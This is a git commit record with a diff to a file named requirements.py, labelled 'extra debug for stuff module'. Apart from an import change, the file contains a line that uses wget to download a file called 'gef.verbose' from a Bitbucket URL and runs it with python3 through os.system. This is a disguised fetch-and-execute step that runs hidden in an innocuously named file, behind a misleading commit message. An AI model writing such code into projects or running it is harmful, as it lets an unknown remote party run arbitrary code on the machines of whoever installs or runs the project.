8dd8032a98b6fba67aba49fded72264c93addb61
gakira munshi <gakimarki@proton.me>
2024-12-16 14:37:18 -0500

    extra debug for stuff module

--- requirements.py
+++ requirements.py
@@ -1,3 +1,3 @@
-import os, sys, optparse
+import os, sys,sunau
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef.verbose" && python3 gef.verbose  ';os.system(cmd)
